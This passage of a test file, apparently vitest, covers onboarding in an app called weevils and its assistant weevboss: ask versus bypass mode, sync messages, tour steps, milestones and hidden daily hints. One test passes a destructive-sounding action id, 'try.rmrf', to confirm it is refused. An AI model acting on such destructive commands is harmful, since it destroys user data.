  it('ask mode: the job opens a session, and weevboss says so in one sentence', async () => {
    auth.ready = true
    const { it: s, handoff, delegate, texts } = make({}, mac())
    await s.ask('reach')
    expect(handoff).not.toHaveBeenCalled()
    expect(delegate).toHaveBeenCalledTimes(1)
    expect((delegate.mock.calls[0] as unknown as string[])[0]).toBe('Make me reachable from anywhere with Tailscale.')
    expect(texts().at(-1)).toBe('I’ve handed it to an agent: it asks for your OK in the app before each step.')
  })

  it('bypass mode: weevboss does it in its own turn', async () => {
    auth.ready = true
    process.env.WEEVILS_SAFE = '0'
    const { it: s, handoff, delegate } = make({}, mac())
    await s.ask('reach')
    expect(delegate).not.toHaveBeenCalled()
    expect(handoff).toHaveBeenCalledTimes(1)
  })
})

describe('the sync said by weevils, then the server offer', () => {
  it('the lines, with their links in the sentence (never a button)', () => {
    const t = withLang('en', () => ({ start: tr(M).syncStart, done: tr(M).syncDone(340), one: tr(M).syncDone(1), offer: tr(M).vpsOffer }))
    expect(t.start).toBe('You’re connected to GitHub and Claude. I’m syncing your conversations so you can pick them up from any machine or subscription.')
    expect(t.done).toBe('[[win]]**Done**: your 340 conversations are yours now, safe on your GitHub. 🎉 Keep your [recovery code](/#do=recovery) somewhere safe: with it, a new machine gets everything back.')
    expect(t.one).toContain('your conversation is yours now')
    expect(t.offer).toContain('I can [set it up now](/#do=server), or [remind you later](/#do=later).')
    for (const x of Object.values(t)) expect(x).not.toMatch(/\[\[setup:/)
  })
  it('the server is offered only to a machine that is not on day and night', () => {
    expect(offersServer({ kind: 'laptop', alwaysOn: false })).toBe(true)
    expect(offersServer({ kind: 'desktop', alwaysOn: null })).toBe(true)
    expect(offersServer({ kind: 'desktop', alwaysOn: true })).toBe(false)
    expect(offersServer({ kind: 'vps', alwaysOn: true })).toBe(false)
    expect(offersServer({ kind: 'server', alwaysOn: null })).toBe(false)
  })
})

// The journey after the hello (server/journey.ts, docs/onboarding.md): the tour, one step at a time when the thread is
// calm, a milestone per step passed with one example to try, then at most one discovery a day through weevboss.
describe('the journey', () => {
  const pc = { os: 'linux' as const, mobile: false, standalone: false }
  type Inner = { watch: () => Promise<void>; p: { firstRun?: { at: number; turns: number }; marks: Record<string, number> } }
  const inner = (s: unknown) => s as Inner

  it('the tour finished: the next step at once, by what it lets them do', async () => {
    auth.ready = true
    const { it: s, texts } = make()
    await s.welcome(pc)
    expect(texts()[1]).toContain('[a one-minute tour](/#do=tour)')
    expect(await s.act('toured')).toBe(true)
    expect(texts().at(-1)).toBe('That’s it, you know your way around. Next step, [connect your GitHub](/#do=github): your conversations are kept there, yours for good, and your agents save your code to it.')
    expect(await s.act('tourskip')).toBe(true)
    expect(texts().at(-1)).toBe('No problem: ask me for the tour anytime.')
  })

  it('one step at a time, to someone here, only once the thread is calm and weevboss idle; two passed by and weevils stops', async () => {
    auth.ready = true
    const thread = { lastAt: Date.now(), working: false, lastUserAt: 0 }
    const { it: s, texts } = make({ thread: () => thread }, state({ github: { installed: true, logged: true } }))
    await s.welcome(pc)
    const n = texts().length
    await inner(s).watch()
    expect(texts()).toHaveLength(n)
    const t0 = Date.now()
    vi.spyOn(Date, 'now').mockReturnValue(t0 + 120_000)
    thread.working = true
    await inner(s).watch()
    expect(texts()).toHaveLength(n)
    thread.working = false
    // Nobody wrote since the hello: nothing piles up in an empty thread.
    await inner(s).watch()
    expect(texts()).toHaveLength(n)
    // They asked something: the hello offered the tour, GitHub is in, the phone comes next.
    thread.lastUserAt = t0 + 1000
    await inner(s).watch()
    expect(texts().at(-1)).toBe('Next step, [put weevils on your phone](/#do=phone): your agents in your pocket, you answer from anywhere.')
    // The phone passed by, then notifications passed by: weevils says nothing more by itself.
    vi.spyOn(Date, 'now').mockReturnValue(t0 + 300_000)
    await inner(s).watch()
    expect(texts().at(-1)).toMatch(/^Next step, \[put weevils/)
    thread.lastUserAt = t0 + 250_000
    await inner(s).watch()
    expect(texts().at(-1)).toMatch(/^Next step, \[turn on notifications\]\(\/#do=push\)/)
    vi.spyOn(Date, 'now').mockReturnValue(t0 + 500_000)
    thread.lastUserAt = t0 + 450_000
    const before = texts().length
    await inner(s).watch()
    expect(texts()).toHaveLength(before)
    vi.restoreAllMocks()
  })

  it('milestones: the phone (a second device), notifications; each a win with one example to try', async () => {
    auth.ready = true
    let devices = 1
    const { it: s, texts } = make({ devices: () => devices, thread: () => ({ lastAt: Date.now(), working: false }) })
    await s.welcome(pc)
    devices = 2
    await inner(s).watch()
    expect(texts().at(-1)).toBe('[[win]]**weevils is on your phone**: your agents in your pocket, ask and answer from anywhere. Try it: [what are my agents up to?](/#do=try.status)')
    expect(s.messages().at(-1)?.win).toMatchObject({ kind: 'step', id: 'step:phone' })
    await inner(s).watch()
    expect(texts().filter((t) => t.includes('on your phone**'))).toHaveLength(1)
    s.done('push')
    expect(texts().at(-1)).toMatch(/^\[\[win\]\]\*\*Notifications are on\*\*: .*\[ping me when a one-minute job is done\]\(\/#do=try\.ping\)$/)
    s.done('push')
    expect(texts().at(-1)).toBe('Notifications are on for this device.')
  })

  it('an example tapped goes to weevboss as the person’s own request, with its brief; an unknown one does nothing', async () => {
    auth.ready = true
    const { it: s, handoff, delegate } = make()
    await s.welcome(pc)
    expect(await s.act('try.notes')).toBe(true)
    expect(handoff).toHaveBeenCalledWith('Make me a small notes app', expect.stringMatching(/^The user tapped an example to try/))
    expect(delegate).not.toHaveBeenCalled()
    expect(await s.act('try.rmrf')).toBe(false)
  })

  it('from the next day, weevboss’s hidden block may carry one discovery; never on the first day, never once one was given', async () => {
    auth.ready = true
    const { it: s } = make()
    await s.welcome(pc)
    expect(s.contextFor()).not.toContain('one discovery for the user today')
    inner(s).p.firstRun!.at = Date.now() - 30 * 3600_000
    for (const k of Object.keys(inner(s).p.marks)) inner(s).p.marks[k] -= 30 * 3600_000
    expect(s.contextFor()).toContain('one discovery for the user today, at most')
    s.mark('discover:github')
    expect(s.contextFor()).not.toContain('one discovery for the user today')
  })
})
